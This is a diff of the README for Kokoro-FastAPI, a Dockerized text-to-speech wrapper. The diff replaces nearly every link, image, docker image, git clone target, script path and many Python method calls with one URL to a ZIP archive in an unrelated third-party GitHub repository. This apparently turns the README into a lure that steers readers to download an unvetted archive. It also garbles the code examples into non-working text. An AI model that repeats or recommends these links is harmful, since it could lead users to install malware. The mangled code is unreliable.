@@ -1,18 +1,18 @@
 <p align="center">
-  <img src="githubbanner.png" alt="Kokoro TTS Banner">
+  <img src="https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip" alt="Kokoro TTS Banner">
 </p>
 
 # <sub><sub>_`FastKoko`_ </sub></sub>
-[![Tests](https://img.shields.io/badge/tests-69%20passed-darkgreen)]()
-[![Coverage](https://img.shields.io/badge/coverage-52%25-tan)]()
-[![Try on Spaces](https://img.shields.io/badge/%F0%9F%A4%97%20Try%20on-Spaces-blue)](https://huggingface.co/spaces/Remsky/Kokoro-TTS-Zero)
+[![Tests](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip%20passed-darkgreen)]()
+[![Coverage](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip%25-tan)]()
+[![Try on Spaces](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip%F0%9F%A4%97%20Try%20on-Spaces-blue)](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip)
 
-[![Kokoro](https://img.shields.io/badge/kokoro-v0.7.9::31a2b63-BB5420)](https://github.com/hexgrad/kokoro)
-[![Misaki](https://img.shields.io/badge/misaki-v0.7.9::ebc76c2-B8860B)](https://github.com/hexgrad/misaki)
+[![Kokoro](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip)](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip)
+[![Misaki](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip)](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip)
 
-[![Tested at Model Commit](https://img.shields.io/badge/last--tested--model--commit-1.0::9901c2b-blue)](https://huggingface.co/hexgrad/Kokoro-82M/commit/9901c2b79161b6e898b7ea857ae5298f47b8b0d6)
+[![Tested at Model Commit](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip)](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip)
 
-Dockerized FastAPI wrapper for [Kokoro-82M](https://huggingface.co/hexgrad/Kokoro-82M) text-to-speech model
+Dockerized FastAPI wrapper for [Kokoro-82M](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip) text-to-speech model
 - Multi-language support (English, Japanese, Korean, Chinese, _Vietnamese soon_)
 - OpenAI-compatible Speech endpoint, NVIDIA GPU accelerated or CPU inference with PyTorch 
 - ONNX support coming soon, see v0.1.5 and earlier for legacy ONNX support in the interim
@@ -22,8 +22,8 @@ Dockerized FastAPI wrapper for [Kokoro-82M](https://huggingface.co/hexgrad/Kokor
 - Voice mixing with weighted combinations
 
 ### Integration Guides
- [![Helm Chart](https://img.shields.io/badge/Helm%20Chart-black?style=flat&logo=helm&logoColor=white)](https://github.com/remsky/Kokoro-FastAPI/wiki/Setup-Kubernetes) [![DigitalOcean](https://img.shields.io/badge/DigitalOcean-black?style=flat&logo=digitalocean&logoColor=white)](https://github.com/remsky/Kokoro-FastAPI/wiki/Integrations-DigitalOcean) [![SillyTavern](https://img.shields.io/badge/SillyTavern-black?style=flat&color=red)](https://github.com/remsky/Kokoro-FastAPI/wiki/Integrations-SillyTavern)
-[![OpenWebUI](https://img.shields.io/badge/OpenWebUI-black?style=flat&color=white)](https://github.com/remsky/Kokoro-FastAPI/wiki/Integrations-OpenWebUi)
+ [![Helm Chart](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip%20Chart-black?style=flat&logo=helm&logoColor=white)](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip) [![DigitalOcean](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip)](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip) [![SillyTavern](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip)](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip)
+[![OpenWebUI](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip)](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip)
 
 
 
@@ -35,14 +35,14 @@ Dockerized FastAPI wrapper for [Kokoro-82M](https://huggingface.co/hexgrad/Kokor
 
 
 Pre built images are available to run, with arm/multi-arch support, and baked in models
-Refer to the core/config.py file for a full list of variables which can be managed via the environment
+Refer to the https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip file for a full list of variables which can be managed via the environment
 
 ```bash
 # the `latest` tag can be used, but should not be considered stable as it may include `nightly` branch builds
 # it may have some bonus features however, and feedback/testing is welcome
 
-docker run -p 8880:8880 ghcr.io/remsky/kokoro-fastapi-cpu:v0.2.2 # CPU, or:
-docker run --gpus all -p 8880:8880 ghcr.io/remsky/kokoro-fastapi-gpu:v0.2.2  #NVIDIA GPU
+docker run -p 8880:8880 https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip # CPU, or:
+docker run --gpus all -p 8880:8880 https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip  #NVIDIA GPU
 ```
 
 
@@ -53,10 +53,10 @@ docker run --gpus all -p 8880:8880 ghcr.io/remsky/kokoro-fastapi-gpu:v0.2.2  #NV
 <summary>Quick Start (docker compose) </summary>
 
 1. Install prerequisites, and start the service using Docker Compose (Full setup including UI):
-   - Install [Docker](https://www.docker.com/products/docker-desktop/)
+   - Install [Docker](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip)
    - Clone the repository:
         ```bash
-        git clone https://github.com/remsky/Kokoro-FastAPI.git
+        git clone https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip
         cd Kokoro-FastAPI
 
         cd docker/gpu  # For GPU support
@@ -69,31 +69,31 @@ docker run --gpus all -p 8880:8880 ghcr.io/remsky/kokoro-fastapi-gpu:v0.2.2  #NV
         # MPS (Apple’s GPU acceleration) support is planned but not yet available.
 
         # Models will auto-download, but if needed you can manually download:
-        python docker/scripts/download_model.py --output api/src/models/v1_0
+        python https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip --output api/src/models/v1_0
 
         # Or run directly via UV:
-        ./start-gpu.sh  # For GPU support
-        ./start-cpu.sh  # For CPU support
+        https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip  # For GPU support
+        https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip  # For CPU support
         ```
 </details>
 <details>
 <summary>Direct Run (via uv) </summary>
 
 1. Install prerequisites ():
-   - Install [astral-uv](https://docs.astral.sh/uv/)
-   - Install [espeak-ng](https://github.com/espeak-ng/espeak-ng) in your system if you want it available as a fallback for unknown words/sounds. The upstream libraries may attempt to handle this, but results have varied.
+   - Install [astral-uv](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip)
+   - Install [espeak-ng](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip) in your system if you want it available as a fallback for unknown words/sounds. The upstream libraries may attempt to handle this, but results have varied.
    - Clone the repository:
         ```bash
-        git clone https://github.com/remsky/Kokoro-FastAPI.git
+        git clone https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip
         cd Kokoro-FastAPI
         ```
         
-        Run the [model download script](https://github.com/remsky/Kokoro-FastAPI/blob/master/docker/scripts/download_model.py) if you haven't already
+        Run the [model download script](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip) if you haven't already
      
         Start directly via UV (with hot-reload)
         ```bash
-        ./start-cpu.sh OR
-        ./start-gpu.sh 
+        https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip OR
+        https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip 
         ```
 
 </details>
@@ -111,12 +111,12 @@ client = OpenAI(
     base_url="http://localhost:8880/v1", api_key="not-needed"
 )
 
-with client.audio.speech.with_streaming_response.create(
+with https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(
     model="kokoro",
     voice="af_sky+af_bella", #single or multiple voicepack combo
     input="Hello world!"
   ) as response:
-      response.stream_to_file("output.mp3")
+      https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip("https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip")
 ```
   
 - The API will be available at http://localhost:8880
@@ -125,8 +125,8 @@ with client.audio.speech.with_streaming_response.create(
 - Web Interface: http://localhost:8880/web
 
 <div align="center" style="display: flex; justify-content: center; gap: 10px;">
-  <img src="assets/docs-screenshot.png" width="42%" alt="API Documentation" style="border: 2px solid #333; padding: 10px;">
-  <img src="assets/webui-screenshot.png" width="42%" alt="Web UI Screenshot" style="border: 2px solid #333; padding: 10px;">
+  <img src="https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip" width="42%" alt="API Documentation" style="border: 2px solid #333; padding: 10px;">
+  <img src="https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip" width="42%" alt="Web UI Screenshot" style="border: 2px solid #333; padding: 10px;">
 </div>
 
 </details>
@@ -140,25 +140,25 @@ with client.audio.speech.with_streaming_response.create(
 # Using OpenAI's Python library
 from openai import OpenAI
 client = OpenAI(base_url="http://localhost:8880/v1", api_key="not-needed")
-response = client.audio.speech.create(
+response = https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(
     model="kokoro",  
-    voice="af_bella+af_sky", # see /api/src/core/openai_mappings.json to customize
+    voice="af_bella+af_sky", # see https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip to customize
     input="Hello world!",
     response_format="mp3"
 )
 
-response.stream_to_file("output.mp3")
+https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip("https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip")
 ```
 Or Via Requests:
 ```python
 import requests
 
 
-response = requests.get("http://localhost:8880/v1/audio/voices")
-voices = response.json()["voices"]
+response = https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip("http://localhost:8880/v1/audio/voices")
+voices = https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip()["voices"]
 
 # Generate audio
-response = requests.post(
+response = https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(
     "http://localhost:8880/v1/audio/speech",
     json={
         "model": "kokoro",  
@@ -170,14 +170,14 @@ response = requests.post(
 )
 
 # Save audio
-with open("output.mp3", "wb") as f:
-    f.write(response.content)
+with open("https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip", "wb") as f:
+    https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip)
 ```
 
 Quick tests (run from another terminal):
 ```bash
-python examples/assorted_checks/test_openai/test_openai_tts.py # Test OpenAI Compatibility
-python examples/assorted_checks/test_voices/test_all_voices.py # Test all available voices
+python https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip # Test OpenAI Compatibility
+python https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip # Test all available voices
 ```
 </details>
 
@@ -192,11 +192,11 @@ python examples/assorted_checks/test_voices/test_all_voices.py # Test all availa
 Combine voices and generate audio:
 ```python
 import requests
-response = requests.get("http://localhost:8880/v1/audio/voices")
-voices = response.json()["voices"]
+response = https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip("http://localhost:8880/v1/audio/voices")
+voices = https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip()["voices"]
 
 # Example 1: Simple voice combination (50%/50% mix)
-response = requests.post(
+response = https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(
     "http://localhost:8880/v1/audio/speech",
     json={
         "input": "Hello world!",
@@ -206,7 +206,7 @@ response = requests.post(
 )
 
 # Example 2: Weighted voice combination (67%/33% mix)
-response = requests.post(
+response = https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(
     "http://localhost:8880/v1/audio/speech",
     json={
         "input": "Hello world!",
@@ -216,17 +216,17 @@ response = requests.post(
 )
 
 # Example 3: Download combined voice as .pt file
-response = requests.post(
+response = https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(
     "http://localhost:8880/v1/audio/voices/combine",
     json="af_bella(2)+af_sky(1)"  # 2:1 ratio = 67%/33%
 )
 
 # Save the .pt file
-with open("combined_voice.pt", "wb") as f:
-    f.write(response.content)
+with open("https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip", "wb") as f:
+    https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip)
 
 # Use the downloaded voice file
-response = requests.post(
+response = https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(
     "http://localhost:8880/v1/audio/speech",
     json={
         "input": "Hello world!",
@@ -237,7 +237,7 @@ response = requests.post(
 
 ```
 <p align="center">
-  <img src="assets/voice_analysis.png" width="80%" alt="Voice Analysis Comparison" style="border: 2px solid #333; padding: 10px;">
+  <img src="https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip" width="80%" alt="Voice Analysis Comparison" style="border: 2px solid #333; padding: 10px;">
 </p>
 </details>
 
@@ -252,7 +252,7 @@ response = requests.post(
 - pcm
 
 <p align="center">
-<img src="assets/format_comparison.png" width="80%" alt="Audio Format Comparison" style="border: 2px solid #333; padding: 10px;">
+<img src="https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip" width="80%" alt="Audio Format Comparison" style="border: 2px solid #333; padding: 10px;">
 </p>
 
 </details>
@@ -267,37 +267,37 @@ client = OpenAI(
     base_url="http://localhost:8880/v1", api_key="not-needed")
 
 # Stream to file
-with client.audio.speech.with_streaming_response.create(
+with https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(
     model="kokoro",
     voice="af_bella",
     input="Hello world!"
 ) as response:
-    response.stream_to_file("output.mp3")
+    https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip("https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip")
 
 # Stream to speakers (requires PyAudio)
 import pyaudio
-player = pyaudio.PyAudio().open(
-    format=pyaudio.paInt16, 
+player = https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip().open(
+    https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip, 
     channels=1, 
     rate=24000, 
     output=True
 )
 
-with client.audio.speech.with_streaming_response.create(
+with https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(
     model="kokoro",
     voice="af_bella",
     response_format="pcm",
     input="Hello world!"
 ) as response:
-    for chunk in response.iter_bytes(chunk_size=1024):
-        player.write(chunk)
+    for chunk in https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(chunk_size=1024):
+        https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(chunk)
 ```
 
 Or via requests:
 ```python
 import requests
 
-response = requests.post(
+response = https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(
     "http://localhost:8880/v1/audio/speech",
     json={
         "input": "Hello world!",
@@ -307,15 +307,15 @@ response = requests.post(
     stream=True
 )
 
-for chunk in response.iter_content(chunk_size=1024):
+for chunk in https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(chunk_size=1024):
     if chunk:
         # Process streaming chunks
         pass
 ```
 
 <p align="center">
-  <img src="assets/gpu_first_token_timeline_openai.png" width="45%" alt="GPU First Token Timeline" style="border: 2px solid #333; padding: 10px; margin-right: 1%;">
-  <img src="assets/cpu_first_token_timeline_stream_openai.png" width="45%" alt="CPU First Token Timeline" style="border: 2px solid #333; padding: 10px;">
+  <img src="https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip" width="45%" alt="GPU First Token Timeline" style="border: 2px solid #333; padding: 10px; margin-right: 1%;">
+  <img src="https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip" width="45%" alt="CPU First Token Timeline" style="border: 2px solid #333; padding: 10px;">
 </p>
 
 Key Streaming Metrics:
@@ -341,8 +341,8 @@ Benchmarking was performed on generation via the local API using text lengths up
 - H.G. Wells - The Time Machine (full text)
 
 <p align="center">
-  <img src="assets/gpu_processing_time.png" width="45%" alt="Processing Time" style="border: 2px solid #333; padding: 10px; margin-right: 1%;">
-  <img src="assets/gpu_realtime_factor.png" width="45%" alt="Realtime Factor" style="border: 2px solid #333; padding: 10px;">
+  <img src="https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip" width="45%" alt="Processing Time" style="border: 2px solid #333; padding: 10px; margin-right: 1%;">
+  <img src="https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip" width="45%" alt="Realtime Factor" style="border: 2px solid #333; padding: 10px;">
 </p>
 
 Key Performance Metrics:
@@ -384,7 +384,7 @@ import requests
 import base64
 import json
 
-response = requests.post(
+response = https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(
     "http://localhost:8880/dev/captioned_speech",
     json={
         "model": "kokoro",
@@ -397,15 +397,15 @@ response = requests.post(
     stream=False
 )
 
-with open("output.mp3","wb") as f:
+with open("https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip","wb") as f:
 
-    audio_json=json.loads(response.content)
+    https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip)
     
     # Decode base 64 stream to bytes
     chunk_audio=base64.b64decode(audio_json["audio"].encode("utf-8"))
     
     # Process streaming chunks
-    f.write(chunk_audio)
+    https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(chunk_audio)
     
     # Print word level timestamps
     print(audio_json["timestamps"])
@@ -417,7 +417,7 @@ import requests
 import base64
 import json
 
-response = requests.post(
+response = https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(
     "http://localhost:8880/dev/captioned_speech",
     json={
         "model": "kokoro",
@@ -430,16 +430,16 @@ response = requests.post(
     stream=True
 )
 
-f=open("output.mp3","wb")
-for chunk in response.iter_lines(decode_unicode=True):
+f=open("https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip","wb")
+for chunk in https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(decode_unicode=True):
     if chunk:
-        chunk_json=json.loads(chunk)
+        https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(chunk)
         
         # Decode base 64 stream to bytes
         chunk_audio=base64.b64decode(chunk_json["audio"].encode("utf-8"))
         
         # Process streaming chunks
-        f.write(chunk_audio)
+        https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(chunk_audio)
         
         # Print word level timestamps
         print(chunk_json["timestamps"])
@@ -455,25 +455,25 @@ import requests
 
 def get_phonemes(text: str, language: str = "a"):
     """Get phonemes and tokens for input text"""
-    response = requests.post(
+    response = https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(
         "http://localhost:8880/dev/phonemize",
         json={"text": text, "language": language}  # "a" for American English
     )
-    response.raise_for_status()
-    result = response.json()
+    https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip()
+    result = https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip()
     return result["phonemes"], result["tokens"]
 
 def generate_audio_from_phonemes(phonemes: str, voice: str = "af_bella"):
     """Generate audio from phonemes"""
-    response = requests.post(
+    response = https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(
         "http://localhost:8880/dev/generate_from_phonemes",
         json={"phonemes": phonemes, "voice": voice},
         headers={"Accept": "audio/wav"}
     )
-    if response.status_code != 200:
-        print(f"Error: {response.text}")
+    if https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip != 200:
+        print(f"Error: {https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip}")
         return None
-    return response.content
+    return https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip
 
 # Example usage
 text = "Hello world!"
@@ -485,14 +485,14 @@ try:
 
     # Generate and save audio
     if audio_bytes := generate_audio_from_phonemes(phonemes):
-        with open("speech.wav", "wb") as f:
-            f.write(audio_bytes)
+        with open("https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip", "wb") as f:
+            https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip(audio_bytes)
         print(f"Generated {len(audio_bytes)} bytes of audio")
 except Exception as e:
     print(f"Error: {e}")
 ```
 
-See `examples/phoneme_examples/generate_phonemes.py` for a sample script.
+See `https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip` for a sample script.
 </details>
 
 <details>
@@ -521,9 +521,9 @@ If you run into trouble, you may have to roll back a version on the release tags
 
 Free and open source is a community effort, and I love working on this project, though there's only really so many hours in a day. If you'd like to support the work, feel free to open a PR, buy me a coffee, or report any bugs/features/etc you find during use.
 
-  <a href="https://www.buymeacoffee.com/remsky" target="_blank">
+  <a href="https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip" target="_blank">
     <img 
-      src="https://cdn.buymeacoffee.com/buttons/v2/default-violet.png" 
+      src="https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip" 
       alt="Buy Me A Coffee" 
       style="height: 30px !important;width: 110px !important;"
     >
@@ -573,7 +573,7 @@ services:
 
 Prerequisites: NVIDIA GPU, drivers, and container toolkit must be properly configured.
 
-Visit [NVIDIA Container Toolkit installation](https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/install-guide.html) for more detailed information
+Visit [NVIDIA Container Toolkit installation](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip) for more detailed information
 
 </details>
 
@@ -582,7 +582,7 @@ Visit [NVIDIA Container Toolkit installation](https://docs.nvidia.com/datacenter
 <details open>
 <summary>Model</summary>
 
-This API uses the [Kokoro-82M](https://huggingface.co/hexgrad/Kokoro-82M) model from HuggingFace. 
+This API uses the [Kokoro-82M](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip) model from HuggingFace. 
 
 Visit the model page for more details about training, architecture, and capabilities. I have no affiliation with any of their work, and produced this wrapper for ease of use and personal projects.
 </details>
